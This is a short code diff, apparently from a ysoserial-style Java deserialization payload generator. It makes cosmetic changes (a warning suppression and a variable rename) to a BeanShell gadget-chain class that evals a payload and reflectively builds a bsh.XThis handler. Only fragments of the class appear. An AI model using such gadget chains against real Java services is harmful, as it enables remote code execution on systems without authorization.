@@ -14,7 +14,7 @@ import java.util.PriorityQueue;
  * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
  */
 
-@SuppressWarnings({"rawtypes", "unchecked"})
+@SuppressWarnings({"rawtypes", "unchecked","unused"})
 @Dependencies({"org.beanshell:bsh:2.0b1"})
 @Authors({Authors.KILLER})
 public class BeanShell2 implements ObjectPayload<PriorityQueue> {
@@ -28,10 +28,10 @@ public class BeanShell2 implements ObjectPayload<PriorityQueue> {
         setu.invoke(i, "bsh.cwd", ".");
         i.eval(payload);
 
-        Class<?> xthis = Class.forName("bsh.XThis");
-        Field handlerField = xthis.getDeclaredField("invocationHandler");
+        Class<?> xThis = Class.forName("bsh.XThis");
+        Field handlerField = xThis.getDeclaredField("invocationHandler");
         handlerField.setAccessible(true);
-        Constructor<?> xthisDeclaredConstructor = xthis.getDeclaredConstructor(NameSpace.class, Interpreter.class);
+        Constructor<?> xthisDeclaredConstructor = xThis.getDeclaredConstructor(NameSpace.class, Interpreter.class);
         xthisDeclaredConstructor.setAccessible(true);
         Object xt = xthisDeclaredConstructor.newInstance(i.getNameSpace(), i);
         handlerField.setAccessible(true);
